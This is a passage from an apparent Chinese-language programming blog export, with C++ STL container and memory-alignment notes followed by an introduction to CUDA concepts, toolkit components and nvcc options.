class="line">    sms1.<span class="built_in">insert</span>(msg2);</span><br><span class="line">    sms1.<span class="built_in">insert</span>(msg3);</span><br><span class="line"></span><br><span class="line">    std::set&lt;Message, MessageComparator&gt; sms2;</span><br><span class="line">    sms2.<span class="built_in">insert</span>(msg1);</span><br><span class="line">    sms2.<span class="built_in">insert</span>(msg2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; msg : sms1)</span><br><span class="line">        std::cout &lt;&lt; msg.<span class="built_in">getContent</span>(); <span class="comment">// AB</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; msg : sms2)</span><br><span class="line">        std::cout &lt;&lt; msg.<span class="built_in">getContent</span>(); <span class="comment">// BA</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-set-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::set&lt;<span class="type">int</span>&gt; <span class="title">S</span><span class="params">(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use advance</span></span><br><span class="line">std::set&lt;<span class="type">int</span>&gt;::iterator it = S.<span class="built_in">begin</span>();</span><br><span class="line">std::<span class="built_in">advance</span>(it, <span class="number">2</span>); <span class="comment">// (*it) is 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use next</span></span><br><span class="line"><span class="keyword">auto</span> it = std::<span class="built_in">next</span>(S.<span class="built_in">begin</span>(), <span class="number">2</span>);  <span class="comment">// (*it) is 3</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-set-3"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::set&lt;<span class="type">int</span>&gt; S1;</span><br><span class="line">std::pair&lt;std::set&lt;<span class="type">int</span>&gt;::iterator, <span class="type">bool</span>&gt; result = S1.<span class="built_in">insert</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (result.second)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Inserted sucessfuly&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::vector&lt;std::string&gt; V1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>&#125;;</span><br><span class="line">std::set&lt;std::string&gt; S2;</span><br><span class="line">S2.<span class="built_in">insert</span>(V1.<span class="built_in">begin</span>(), V1.<span class="built_in">end</span>()); <span class="comment">// S2 = &#123;1, 2, 3&#125;</span></span><br><span class="line"></span><br><span class="line">std::set&lt;std::string&gt; S3;</span><br><span class="line">S3.<span class="built_in">insert</span>(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;); <span class="comment">// S3 = &#123;1, 2, 3&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-set-4"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::set&lt;<span class="type">int</span>&gt; <span class="title">S</span><span class="params">(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// by iterator</span></span><br><span class="line">std::set&lt;std::string&gt;::iterator it = S.<span class="built_in">find</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (it != S.<span class="built_in">end</span>())</span><br><span class="line">    S.<span class="built_in">erase</span>(it);</span><br><span class="line"></span><br><span class="line"><span class="comment">// by iterator (multi-element)</span></span><br><span class="line">std::set&lt;std::string&gt;::iterator start = S.<span class="built_in">find</span>(<span class="number">2</span>);</span><br><span class="line">std::set&lt;std::string&gt;::iterator last = S.<span class="built_in">find</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (start != S.<span class="built_in">end</span>() &amp;&amp; last != S.<span class="built_in">end</span>())</span><br><span class="line">    S.<span class="built_in">erase</span>(start, last);</span><br><span class="line"></span><br><span class="line"><span class="comment">// by value (allow not exist)</span></span><br><span class="line">S.<span class="built_in">erase</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n) delete a element</span></span><br><span class="line">std::set&lt;<span class="type">int</span>&gt;::iterator it = S.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (it != S.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*it == element)</span><br><span class="line">        it = S.<span class="built_in">erase</span>(it);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        it++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="unordered-set-c-11"><a href="#unordered-set-c-11" class="headerlink" title="unordered_set (c++11)"></a>unordered_set (c++11)</h2><ul>
<li>哈希表，元素首先被hasher-function处理后选择对应的桶，是未排序的</li>
</ul>
<div class="tabs" id="stl-unordered_set"><ul class="nav-tabs"><li class="tab active"><a href="#stl-unordered_set-1">hasher-function</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stl-unordered_set-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">StringHasher</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> std::string&amp; s)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">hash</span>&lt;<span class="type">int</span>&gt;()(s.<span class="built_in">length</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">StringComparator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> std::string&amp; s1, <span class="type">const</span> std::string&amp; s2)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s1.<span class="built_in">length</span>() == s2.<span class="built_in">length</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::unordered_set&lt;std::string, StringHasher, StringComparator&gt; US;</span><br><span class="line">    US.<span class="built_in">insert</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    US.<span class="built_in">insert</span>(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    US.<span class="built_in">insert</span>(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">    US.<span class="built_in">insert</span>(<span class="string">&quot;dddd&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> std::string&amp; s : US)</span><br><span class="line">        std::cout &lt;&lt; s; <span class="comment">// ddddaccc</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><ul>
<li>平衡二叉树，key是唯一的，且是排序的（同<a href="#set">set</a>）</li>
<li>key-value对中只允许value被修改</li>
<li><code>operator[]</code>会先在key中寻找元素，如果找不到就创建新的pair并返回默认value，找到后返回对应的value</li>
</ul>
<div class="tabs" id="stl-map"><ul class="nav-tabs"><li class="tab active"><a href="#stl-map-1">exist</a></li><li class="tab"><a href="#stl-map-2">insert</a></li><li class="tab"><a href="#stl-map-3">delete</a></li><li class="tab"><a href="#stl-map-4">search</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stl-map-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; M = &#123;</span><br><span class="line">    &#123; <span class="string">&quot;first&quot;</span>, <span class="number">1</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;second&quot;</span>, <span class="number">2</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;third&quot;</span>, <span class="number">3</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (M.<span class="built_in">count</span>(<span class="string">&quot;second&quot;</span>) &gt; <span class="number">0</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;&#x27;second&#x27; Found&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt;::iterator it = M.<span class="built_in">find</span>(<span class="string">&quot;second&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (it != M.<span class="built_in">end</span>())</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;&#x27;second&#x27; Found&quot;</span>;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-map-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iterator&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; M;</span><br><span class="line">std::pair&lt;std::map&lt;std::string, <span class="type">int</span>&gt;::iterator, <span class="type">bool</span> &gt; result = M.<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;std::string, <span class="type">int</span>&gt;(<span class="string">&quot;first&quot;</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (result.second)</span><br><span class="line">    std::cout &lt;&lt; result.first-&gt;first &lt;&lt; <span class="string">&quot; inserted sucessfuly&quot;</span>;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-map-3"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; M = &#123;</span><br><span class="line">    &#123; <span class="string">&quot;A&quot;</span>, <span class="number">1</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;B&quot;</span>, <span class="number">2</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;C&quot;</span>, <span class="number">3</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// by iterator</span></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt;::iterator it = M.<span class="built_in">find</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (it != M.<span class="built_in">end</span>())</span><br><span class="line">    M.<span class="built_in">erase</span>(it);</span><br><span class="line"></span><br><span class="line"><span class="comment">// by iterator (multi-element)</span></span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt;::iterator start = M.<span class="built_in">find</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt;::iterator last = M.<span class="built_in">find</span>(<span class="string">&quot;C&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (start != M.<span class="built_in">end</span>() &amp;&amp; last != M.<span class="built_in">end</span>())</span><br><span class="line">    M.<span class="built_in">erase</span>(start, last);</span><br><span class="line"></span><br><span class="line"><span class="comment">// by value (allow not exist)</span></span><br><span class="line"><span class="type">int</span> result = M.<span class="built_in">erase</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">1</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Element with key &#x27;B&#x27; deleted&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n) delete a element</span></span><br><span class="line">std::set&lt;<span class="type">int</span>&gt;::iterator it = S.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (it != S.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*it == element)</span><br><span class="line">        it = S.<span class="built_in">erase</span>(it);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        it++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stl-map-4"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> K, <span class="keyword">typename</span> V&gt;</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">findByValue</span><span class="params">(std::vector&lt;K&gt;&amp; vec, std::map&lt;K, V&gt;&amp; moe, V value)</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = moe.<span class="built_in">begin</span>(); it != moe.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (it-&gt;second == value) &#123;</span><br><span class="line">            result = <span class="literal">true</span>;</span><br><span class="line">            vec.<span class="built_in">push_back</span>(it-&gt;first);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="unordered-map-c-11"><a href="#unordered-map-c-11" class="headerlink" title="unordered_map (c++11)"></a>unordered_map (c++11)</h2><ul>
<li>哈希表，元素首先被hasher-function处理后选择对应的桶，是未排序的</li>
</ul>
<h1 id="内存（Memory）"><a href="#内存（Memory）" class="headerlink" title="内存（Memory）"></a>内存（Memory）</h1><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><img data-src="/images/CPP/virtual_memory_layout.png" class="" width="578" height="672" title="Memory Layout of C Program">

<ul>
<li>虚拟内存（virtual memory）被划分为页（page，连续地址的内存块，通常为4KB）<ul>
<li>当读写未映射到物理内存上的页时（missing page interruption，缺页中断），操作系统会将页对应的内容从磁盘装载到物理内存</li>
<li>当物理内存不足时，物理内存中的页也会写回磁盘</li>
</ul>
</li>
<li>从堆（heap）中申请的内存，如果未释放，会导致内存泄漏，即虚拟内存会不断增加。如果申请的堆内存未被使用，并不会映射到物理内存，因此物理内存此时不会增加</li>
<li>每个线程均有独立的栈（stack）空间，其是连续的内存，大小（默认1MB）在线程创建时指定，此内存会自动被回收<ul>
<li>栈中数据：<ul>
<li>函数参数入栈</li>
<li>函数返回值入栈</li>
<li>函数内的本地变量入栈</li>
</ul>
</li>
<li>栈溢出（stack overflow）的可能原因：<ul>
<li>随着函数调用层级逐渐加深，栈空间消耗越来越大</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h2><p><a href="https://stackoverflow.com/questions/381244/purpose-of-memory-alignment">Purpose of memory alignment</a></p>
<ul>
<li>CPU在32位处理器中总是按4字节进行读取，访问未对齐的内存时，需要先找到4字节对齐位置，然后通过偏移量再找到数据位置，访问速度慢一些</li>
<li>CPU操作对齐的内存是原子性的，这意味着没有其他操作会中断它，这对并发编程中的lock-free数据结构很关键</li>
</ul>
<div class="tabs" id="memory_alignment"><ul class="nav-tabs"><li class="tab active"><a href="#memory_alignment-1">16btype_align</a></li></ul><div class="tab-content"><div class="tab-pane active" id="memory_alignment-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">memset_16aligned</span><span class="params">(<span class="type">void</span> *space, <span class="type">char</span> byte, <span class="type">size_t</span> nbytes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>((nbytes &amp; <span class="number">0x0F</span>) == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(((<span class="type">uintptr_t</span>)space &amp; <span class="number">0x0F</span>) == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(space, byte, nbytes);  <span class="comment">// Not a custom implementation of memset()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> *mem = <span class="built_in">malloc</span>(<span class="number">1024</span>+<span class="number">15</span>);</span><br><span class="line">    <span class="type">void</span> *ptr = (<span class="type">void</span> *)(((<span class="type">uintptr_t</span>)mem+<span class="number">15</span>) &amp; ~ (<span class="type">uintptr_t</span>)<span class="number">0x0F</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%08&quot;</span> PRIXPTR <span class="string">&quot;, 0x%08&quot;</span> PRIXPTR <span class="string">&quot;\n&quot;</span>, (<span class="type">uintptr_t</span>)mem, (<span class="type">uintptr_t</span>)ptr);</span><br><span class="line">    <span class="built_in">memset_16aligned</span>(ptr, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h2><p>nothing</p>
<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p><a href="https://sourceware.org/glibc/wiki/MallocInternals">Overview of Malloc</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://learn.microsoft.com/en-us/cpp/cpp/?view=msvc-170">C++ language documentation</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>CPP</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CUDA基础</title>
    <url>/CUDA/Basic.html</url>
    <content><![CDATA[<p>cuda编程基础，其内容主要源自nvidia的编程指南，提取重要概念与设计，结合实例与测试数据于以说明。</p>
<span id="more"></span>

<h1 id="CPU-vs-GPU"><a href="#CPU-vs-GPU" class="headerlink" title="CPU vs GPU"></a>CPU vs GPU</h1><ul>
<li>cpu被设计为在线程（thread）中执行一系列顺序（sequential）操作，可支持几十个线程并行执行<ul>
<li>更多的晶体管用于缓存大数据和复杂的流控制，以支持一系列顺序操作，内存访问延迟较高</li>
</ul>
</li>
<li>gpu被设计为支持成千上万个并行执行序列，常用于分摊较慢的线程，以获取更大的吞吐量<ul>
<li>更多的晶体管用于数据处理（例如浮点计算），以支持高度并行（parallel）计算，内存访问延迟较低</li>
</ul>
</li>
</ul>
<h1 id="CUDA模型"><a href="#CUDA模型" class="headerlink" title="CUDA模型"></a>CUDA模型</h1><p>CUDA: A General-Purpose Parallel Computing Platform and Programming Model</p>
<ul>
<li>2006年被NVIDIA推出的并行计算平台和编程模型，可利用NVIDIA GPUs更好的解决许多复杂的计算问题</li>
<li>CUDA是一种可伸缩（scalable）的编程模型，随着处理器核心数的增加可透明的扩展并行性</li>
<li>CUDA为<code>C</code>程序员保持较低的学习曲线，在语言上扩展的核心概念有：<ul>
<li>线程组的层次结构（a hierarchy of thread groups）</li>
<li>共享内存（shared memories）</li>
<li>栅栏同步（barrier synchronization）</li>
</ul>
</li>
</ul>
<pre class="mermaid">
flowchart LR
%% GPU key abstractions
classDef group fill:#fff,color:#33f,stroke:#f66,stroke-width:1px,stroke-dasharray: 5 5
classDef drive fill:#fff,stroke-width:0,color:green
classDef cas fill:#fff,stroke-width:0,color:red
exec0[execute]:::drive
exec1[execute]:::drive
drive0[resolve]:::drive
drive1[resolve]:::drive
cas0[cooperatively and scalability]:::cas
cas1[cooperatively and scalability]:::cas
SM-A0 --- exec0 --- BK-0 --- drive0 --- CG-0
SM-A1 --- exec1 --- BK-1 --- drive1 --- CG-1
TD-A0 -.- cas0 -.- FG-A0
TD-A1 -.- cas0 -.- FG-A1
TD-A2 -.- cas0 -.- FG-A2
TD-B0 -.- cas1 -.- FG-B0
TD-B1 -.- cas1 -.- FG-B1
TD-B2 -.- cas1 -.- FG-B2
DE-0:::group
subgraph DE-0[GPU-0]
  SM-A0([SM-0])
  SM-A1([SM-1])
end
BK-0:::group
subgraph BK-0[Block-0]
  TD-A0([Thread-0])
  TD-A1([Thread-1])
  TD-A2([Thread-2])
end
CG-0:::group
subgraph CG-0[coarse-grained-0]
  FG-A0([finer-piece-0])
  FG-A1([finer-piece-1])
  FG-A2([finer-piece-2])
end
BK-1:::group
subgraph BK-1[Block-1]
  TD-B0([Thread-0])
  TD-B1([Thread-1])
  TD-B2([Thread-2])
end
CG-1:::group
subgraph CG-1[coarse-grained-1]
  FG-B0([finer-piece-0])
  FG-B1([finer-piece-1])
  FG-B2([finer-piece-2])
end
</pre>

<ul>
<li><strong>SM</strong>: streaming multiprocessors</li>
<li><strong>Block</strong>: block of threads</li>
<li><strong>Thread</strong>: thread within the block</li>
<li><strong>coarse-grained</strong>: coarse sub-problems that can be solved independently in parallel by blocks of threads</li>
<li><strong>finer-piece</strong>: finer pieces that can be solved cooperatively in parallel by all threads within the block</li>
</ul>
<h1 id="硬件设计"><a href="#硬件设计" class="headerlink" title="硬件设计"></a>硬件设计</h1><ul>
<li>NVIDIA GPU架构是围绕一个可扩展的多线程流多处理器阵列（SMs）构建的<ul>
<li>一个多处理器（multiprocessors）被设计成可并发执行数百个线程（thread）</li>
<li>线程块（thread block）或线程块中的线程（threads）均可在一个多处理器中并发执行</li>
<li>采用SIMT (Single-Instruction, Multiple-Thread) 架构，小端（little-endian）表示</li>
</ul>
</li>
</ul>
<h1 id="编程环境"><a href="#编程环境" class="headerlink" title="编程环境"></a>编程环境</h1><p><a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#env-vars">CUDA Environment Variables</a></p>
<ul>
<li><strong>PTX</strong> - CUDA instruction set architecture</li>
</ul>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p><a href="https://docs.nvidia.com/cuda/cuda-installation-guide-microsoft-windows/index.html">CUDA Installation Guide for Microsoft Windows</a><br><a href="https://github.com/NVIDIA/cuda-samples">NVIDIA&#x2F;cuda-samples</a></p>
<ul>
<li><a href="https://www.nvidia.com/en-us/geforce/drivers">GeForce Experience</a> - 自动安装或更新驱动<ul>
<li>安装驱动后在<code>NVIDIA Control Panel - Help - System Information</code>可查看CUDA版本</li>
<li><code>control /name Microsoft.DeviceManager</code>打开设备管理工具，检查显卡状态</li>
<li><code>nvidia-smi</code>工具查看GPU信息</li>
</ul>
</li>
<li><a href="https://developer.nvidia.com/cuda-toolkit">CUDA Toolkit</a> - 开发套件（默认在<code>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA</code>）<ul>
<li><code>nvcc -V</code>查看CUDA Toolkit版本</li>
<li><code>CUDA_PATH=C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.6</code> 环境变量</li>
</ul>
</li>
</ul>
<h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><ul>
<li>windows: cudart.lib&#x2F;dll</li>
<li>linux: cudart.a&#x2F;so</li>
</ul>
<h2 id="Toolkit"><a href="#Toolkit" class="headerlink" title="Toolkit"></a>Toolkit</h2><p><a href="https://developer.download.nvidia.com/compute/cuda/redist/">单个组件压缩包</a></p>
<ul>
<li><strong>cudart</strong> - CUDA Runtime libraries</li>
<li><strong>cuobjdump</strong> - Extracts information from cubin files</li>
<li><strong>cupti</strong> - CUDA Profiling Tools Interface</li>
<li><strong>cuxxfilt</strong> - CUDA <code>cu++filt</code> demangler tool</li>
<li><strong>memcheck</strong> - Functional correctness checking suite</li>
<li><strong>nvcc</strong> - compile CUDA C++ device code<ul>
<li>workflow:<ol>
<li>分离<em>host code</em>和<em>device code</em></li>
<li>将<em>device code</em>编译成<em>assembly form (PTX code)</em> 和 <em>binary form (cubin object)</em></li>
<li>将<em>host code</em>中的<code>&lt;&lt;&lt;...&gt;&gt;&gt;</code>语法替换为cuda运行时函数，然后对 PTX code 或 cubin 对象发起编译</li>
<li>与已编译的<em>host code</em>链接在一起</li>
</ol>
</li>
<li>options:<ul>
<li><code>-code=sm_35</code>指定cubin的目标设备架构（compute capability 3.[&gt;&#x3D;5]的设备）</li>
<li><code>-arch=compute_30</code>指定PTX代码(例如 WarpShuffleFunctions &gt;&#x3D; 3.0)对应的计算能力（宏<code>__CUDA_ARCH__</code>的值为300）</li>
<li><code>-gencode arch=compute_50,code=sm_50</code>指定嵌入cuda应用程序中的PTX和cubin代码</li>
<li><code>-m64</code>指定按64bit模式编译<em>device code</em></li>
<li><code>-m32</code>指定按32bit模式编译<em>device code</em></li>
</ul>
</li>
</ul>
</li>
<li><strong>nvdisasm</strong> - Extracts information from standalone cubin files</li>
<li><strong>nvml_dev</strong> - NVML development libraries and headers</li>
<li><strong>nvprof</strong> - Tool for collecting and viewing CUDA application profiling data</li>
<li><strong>nvprune</strong> - Prunes host object files and libraries to only contain device code</li>
<li><strong>nvrtc</strong> - compile CUDA C++ device code to PTX at runtime</li>
<li><strong>nvtx</strong> - NVTX on Windows</li>
<li><strong>visual_profiler</strong> - Visual Profiler</li>
<li><strong>sanitizer</strong> - Compute Sanitizer API</li>
<li><strong>thrust</strong> - CUDA Thrust</li>
<li><strong>cublas</strong> - cuBLAS runtime libraries</li>
<li><strong>cufft</strong> - cuFFT runtime libraries</li>
<li><strong>curand</strong> - cuRAND runtime libraries</li>
<li><strong>cusolver</strong> - cuSOLVER runtime libraries</li>
<li><strong>cusparse</strong> - cuSPARSE runtime libraries</li>
<li><strong>npp</strong> - NPP runtime libraries</li>
<li><strong>nvjpeg</strong> - nvJPEG libraries</li>
<li><strong>nsight_compute</strong> - Nsight Compute</li>
<li><strong>nsight_systems</strong> - Nsight Systems</li>
</ul>
<h1 id="编程模型-c"><a href="#编程模型-c" class="headerlink" title="编程模型(c++)"></a>编程模型(c++)</h1><p><a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#c-language-extensions">C++ Language Extensions</a><br><a href="https://nvidia.github.io/libcudacxx/">libcu++: NVIDIA C++ Standard Library</a></p>
<h2 id="语言扩展"><a href="#语言扩展" class="headerlink" title="语言扩展"></a>语言扩展</h2><ul>
<li>FunctionExecutionSpace:<ul>
<li><code>__global__</code>：声明可被kernel调用的函数，只能返回void，且不能是类成员函数，只能从host调用它</li>
<li><code>__device__</code>：声明在device上执行的函数，只能从device调用它</li>
<li><code>__host__</code>：声明在host上执行的函数，只能从host调用它（可与<code>__device__</code>一起使用）</li>
<li><code>__CUDA_ARCH__</code>：定义代码兼容的计算能力（SM）</li>
<li><code>__noinline__</code>：提示编译器尽可能不要内联该函数</li>
<li><code>__forceinline__</code>：强制编译器内联该函数</li>
</ul>
</li>
<li>VariableMemorySpace:<ul>
<li><code>__device__</code>：声明驻留在device上的变量</li>
<li><code>__constant__</code>：声明驻留在常量内存空间的变量</li>
<li><code>__shared__</code>：声明驻留在一个线程块的共享内存空间的变量</li>
<li><code>__managed__</code>：声明可被device和host代码直接读写的变量</li>
<li><code>__restrict__</code>：告知编译器指针参数不存在别名，可以优化函数代码</li>
</ul>
</li>
</ul>
<h2 id="设备属性"><a href="#设备属性" class="headerlink" title="设备属性"></a>设备属性</h2><p><a href="https://developer.nvidia.com/cuda-gpus">GPU Compute Capability</a></p>
<ul>
<li><code>SM version (x.x)</code>用于表示设备的<a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#compute-capabilities">计算能力</a>，在运行时可用于检测硬件特性或指令的可用性<ul>
<li><code>major revision number</code>标识核心架构</li>
<li><code>minor revision number</code>标识核心架构的增量更新</li>
</ul>
</li>
</ul>
